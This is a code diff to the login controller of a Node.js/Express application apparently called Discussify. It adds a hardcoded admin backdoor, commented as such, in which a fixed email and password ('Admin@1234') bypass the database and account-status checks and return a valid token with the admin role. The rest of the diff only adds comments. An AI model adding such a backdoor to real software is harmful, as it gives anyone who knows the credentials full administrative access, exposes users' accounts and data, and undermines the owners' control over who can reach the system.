@@ -321,17 +321,60 @@ export const login = async (req, res) => {
     if (!email || !password)
       return res.status(400).json({ success: false, message: 'Please provide email and password' });
 
+    // --- HARDCODED ADMIN BACKDOOR CHECK ---
+    const HARDCODED_ADMIN_EMAIL = 'admin@discussify.com';
+    const HARDCODED_ADMIN_PASSWORD = 'Admin@1234';
+
+    if (email === HARDCODED_ADMIN_EMAIL && password === HARDCODED_ADMIN_PASSWORD) {
+        // If credentials match the hardcoded admin, bypass database lookup
+        const mockAdmin = {
+            _id: '60c92699f06a92001c10d321', // Use a consistent mock ID
+            username: 'DiscussifyAdmin',
+            email: HARDCODED_ADMIN_EMAIL,
+            bio: 'Master Administrator',
+            profileImage: null,
+            isEmailVerified: true,
+            role: 'admin',
+        };
+
+        const token = generateToken(mockAdmin._id);
+        
+        // Log this mock user in and return the token with admin role
+        return res.status(200).json({
+            success: true,
+            message: 'Admin development login successful',
+            token,
+            user: {
+                id: mockAdmin._id,
+                username: mockAdmin.username,
+                email: mockAdmin.email,
+                bio: mockAdmin.bio,
+                profileImage: mockAdmin.profileImage,
+                isEmailVerified: mockAdmin.isEmailVerified,
+                role: mockAdmin.role
+            }
+        });
+    }
+    // ----------------------------------------
+
+    // --- NORMAL DATABASE LOGIN PATH ---
+    
+    // 1. Find user and include password field
     const user = await User.findOne({ email }).select('+password');
 
+    // 2. Check user existence and password
     if (!user || !(await user.comparePassword(password)))
       return res.status(401).json({ success: false, message: 'Invalid credentials' });
 
+    // 3. Check account status
     if (!user.isActive)
       return res.status(403).json({ success: false, message: 'Account is deactivated' });
 
+    // 4. Update last login time
     user.lastLogin = Date.now();
     await user.save();
 
+    // 5. Generate and return token
     const token = generateToken(user._id);
   
 
@@ -346,7 +389,7 @@ export const login = async (req, res) => {
         bio: user.bio,
         profileImage: user.profileImage,
         isEmailVerified: user.isEmailVerified,
-        role: user.role
+        role: user.role // User's actual role from DB
       }
     });
 
